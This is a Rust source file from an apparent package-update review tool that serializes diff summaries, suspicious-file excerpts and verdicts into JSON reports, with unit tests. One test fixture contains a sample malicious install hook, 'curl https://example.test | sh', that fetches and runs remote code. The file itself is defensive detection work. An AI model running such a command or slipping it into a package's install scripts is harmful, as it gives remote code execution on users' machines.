use std::fs;
use std::io;
use std::path::{Path, PathBuf};

use serde::Serialize;

use crate::diff::{DiffSummary, SuspiciousExcerpt};
use crate::registry::Ecosystem;
use crate::review::{Confidence, ReviewOutput, ReviewVerdict};
use crate::signals::Signal;
use crate::state::StateLayout;

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct JsonReport {
    pub status: String,
    pub ecosystem: String,
    pub package: String,
    pub old_version: String,
    pub new_version: String,
    pub summary: JsonDiffSummary,
    pub manifest_diff: Option<String>,
    pub interesting_files: Vec<JsonInterestingFile>,
    pub verdict: String,
    pub confidence: String,
    pub reasons: Vec<String>,
    pub focus_files: Vec<String>,
}

#[derive(Debug, Clone)]
pub struct JsonReportInput<'a> {
    pub status: &'a str,
    pub ecosystem: Ecosystem,
    pub package: &'a str,
    pub old_version: &'a str,
    pub new_version: &'a str,
    pub diff: &'a DiffSummary,
    pub signals: &'a [Signal],
    pub manifest_diff: Option<String>,
    pub interesting_files: &'a [SuspiciousExcerpt],
    pub review: &'a ReviewOutput,
}

impl JsonReport {
    pub fn from_analysis(input: JsonReportInput<'_>) -> Self {
        Self {
            status: input.status.to_string(),
            ecosystem: input.ecosystem.as_str().to_string(),
            package: input.package.to_string(),
            old_version: input.old_version.to_string(),
            new_version: input.new_version.to_string(),
            summary: JsonDiffSummary::from_diff_and_signals(input.diff, input.signals),
            manifest_diff: input.manifest_diff,
            interesting_files: input
                .interesting_files
                .iter()
                .cloned()
                .map(JsonInterestingFile::from)
                .collect(),
            verdict: review_verdict_label(&input.review.verdict).to_string(),
            confidence: confidence_label(&input.review.confidence).to_string(),
            reasons: input.review.reasons.clone(),
            focus_files: input.review.focus_files.clone(),
        }
    }

    pub fn relative_path(&self) -> PathBuf {
        PathBuf::from(&self.ecosystem)
            .join(sanitize_path_component(&self.package))
            .join(format!("{}_to_{}.json", self.old_version, self.new_version))
    }

    pub fn write_to_reports_dir(&self, state_layout: &StateLayout) -> Result<PathBuf, ReportError> {
        let path = state_layout.reports_dir().join(self.relative_path());
        self.write_to_path(&path)?;
        Ok(path)
    }

    pub fn write_to_path(&self, path: impl AsRef<Path>) -> Result<(), ReportError> {
        let path = path.as_ref();
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).map_err(|source| ReportError::Io {
                path: parent.to_path_buf(),
                source,
            })?;
        }

        let json = serde_json::to_string_pretty(self).map_err(ReportError::Serialize)?;
        fs::write(path, format!("{json}\n")).map_err(|source| ReportError::Io {
            path: path.to_path_buf(),
            source,
        })?;
        Ok(())
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct JsonDiffSummary {
    pub files_added: usize,
    pub files_removed: usize,
    pub files_changed: usize,
    pub changed_paths: Vec<String>,
    pub added_paths: Vec<String>,
    pub removed_paths: Vec<String>,
    pub modified_paths: Vec<String>,
    pub signals: Vec<String>,
}

impl JsonDiffSummary {
    pub fn from_diff_and_signals(diff: &DiffSummary, signals: &[Signal]) -> Self {
        Self {
            files_added: diff.files_added,
            files_removed: diff.files_removed,
            files_changed: diff.files_changed,
            changed_paths: diff.changed_paths.clone(),
            added_paths: diff.added_paths.clone(),
            removed_paths: diff.removed_paths.clone(),
            modified_paths: diff.modified_paths.clone(),
            signals: signals
                .iter()
                .copied()
                .map(signal_label)
                .map(str::to_string)
                .collect(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct JsonInterestingFile {
    pub path: String,
    pub reason: String,
    pub excerpt: String,
}

impl From<SuspiciousExcerpt> for JsonInterestingFile {
    fn from(value: SuspiciousExcerpt) -> Self {
        Self {
            path: value.path,
            reason: value.reason,
            excerpt: value.excerpt,
        }
    }
}

#[derive(Debug)]
pub enum ReportError {
    Io { path: PathBuf, source: io::Error },
    Serialize(serde_json::Error),
}

impl std::fmt::Display for ReportError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Io { path, source } => {
                write!(f, "failed to write report {}: {source}", path.display())
            }
            Self::Serialize(source) => write!(f, "failed to serialize report json: {source}"),
        }
    }
}

impl std::error::Error for ReportError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::Io { source, .. } => Some(source),
            Self::Serialize(source) => Some(source),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct MarkdownReport {
    pub title: String,
    pub body: String,
}

fn review_verdict_label(verdict: &ReviewVerdict) -> &'static str {
    match verdict {
        ReviewVerdict::Benign => "benign",
        ReviewVerdict::Suspicious => "suspicious",
        ReviewVerdict::NeedsReview => "needs-review",
    }
}

fn confidence_label(confidence: &Confidence) -> &'static str {
    match confidence {
        Confidence::Low => "low",
        Confidence::Medium => "medium",
        Confidence::High => "high",
    }
}

fn signal_label(signal: Signal) -> &'static str {
    signal.as_str()
}

fn sanitize_path_component(component: &str) -> String {
    let mut sanitized = String::with_capacity(component.len());

    for byte in component.bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'.' | b'_' | b'-' => {
                sanitized.push(byte as char)
            }
            _ => sanitized.push_str(&format!("~{byte:02X}")),
        }
    }

    if sanitized.is_empty() {
        "_".to_string()
    } else {
        sanitized
    }
}

#[cfg(test)]
mod tests {
    use std::fs;
    use std::path::{Path, PathBuf};
    use std::time::{SystemTime, UNIX_EPOCH};

    use serde_json::Value;

    use crate::diff::{DiffSummary, SuspiciousExcerpt};
    use crate::registry::Ecosystem;
    use crate::review::{Confidence, ReviewOutput, ReviewVerdict};
    use crate::signals::Signal;
    use crate::state::StateLayout;

    use super::{JsonReport, JsonReportInput};

    #[test]
    fn builds_machine_readable_json_report() {
        let diff = DiffSummary {
            files_added: 1,
            files_removed: 1,
            files_changed: 2,
            changed_paths: vec![
                "package.json".to_string(),
                "README.md".to_string(),
                "dist/index.js".to_string(),
                "obsolete.js".to_string(),
            ],
            added_paths: vec!["dist/index.js".to_string()],
            removed_paths: vec!["obsolete.js".to_string()],
            modified_paths: vec!["package.json".to_string(), "README.md".to_string()],
        };
        let interesting_files = [SuspiciousExcerpt {
            path: "package.json".to_string(),
            reason: "install script changed".to_string(),
            excerpt: "   4:   \"postinstall\": \"curl https://example.test | sh\"".to_string(),
        }];
        let review = ReviewOutput {
            verdict: ReviewVerdict::Suspicious,
            confidence: Confidence::High,
            reasons: vec!["new install script".to_string()],
            focus_files: vec!["package.json".to_string()],
        };
        let report = JsonReport::from_analysis(JsonReportInput {
            status: "ok",
            ecosystem: Ecosystem::Npm,
            package: "react",
            old_version: "19.0.0",
            new_version: "19.1.0",
            diff: &diff,
            signals: &[Signal::DependencyAdded, Signal::InstallScriptAdded],
            manifest_diff: Some("--- old/package.json\n+++ new/package.json\n".to_string()),
            interesting_files: &interesting_files,
            review: &review,
        });

        assert_eq!(
            report.relative_path(),
            PathBuf::from("npm/react/19.0.0_to_19.1.0.json")
        );
        assert_eq!(
            report.summary.signals,
            vec!["dependency-added", "install-script-added"]
        );
        assert_eq!(report.verdict, "suspicious");
        assert_eq!(report.confidence, "high");
    }

    #[test]
    fn writes_package_json_report_under_state_layout() {
        let repo_root = TestDir::new("reports-layout");
        let state_layout =
            StateLayout::from_repo_root(repo_root.path()).expect("state layout should build");
        let diff = DiffSummary::default();
        let review = ReviewOutput {
            verdict: ReviewVerdict::NeedsReview,
            confidence: Confidence::Medium,
            reasons: vec!["entrypoint changed".to_string()],
            focus_files: vec!["package.json".to_string()],
        };
        let report = JsonReport::from_analysis(JsonReportInput {
            status: "ok",
            ecosystem: Ecosystem::Npm,
            package: "@types/node",
            old_version: "20.0.0",
            new_version: "20.1.0",
            diff: &diff,
            signals: &[Signal::EntrypointChanged],
            manifest_diff: None,
            interesting_files: &[],
            review: &review,
        });

        let path = report
            .write_to_reports_dir(&state_layout)
            .expect("report should be written");
        let json = fs::read_to_string(&path).expect("report file should exist");
        let value: Value = serde_json::from_str(&json).expect("report json should parse");

        assert_eq!(
            path,
            state_layout
                .reports_dir()
                .join("npm")
                .join("~40types~2Fnode")
                .join("20.0.0_to_20.1.0.json")
        );
        assert_eq!(value["package"], "@types/node");
        assert_eq!(value["summary"]["signals"][0], "entrypoint-changed");
        assert_eq!(value["verdict"], "needs-review");
    }

    struct TestDir {
        path: PathBuf,
    }

    impl TestDir {
        fn new(label: &str) -> Self {
            let unique = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .expect("time should move forward")
                .as_nanos();
            let path = std::env::temp_dir().join(format!("pincushion-report-{label}-{unique}"));
            fs::create_dir_all(&path).expect("temp dir should be created");
            Self { path }
        }

        fn path(&self) -> &Path {
            &self.path
        }
    }

    impl Drop for TestDir {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.path);
        }
    }
}
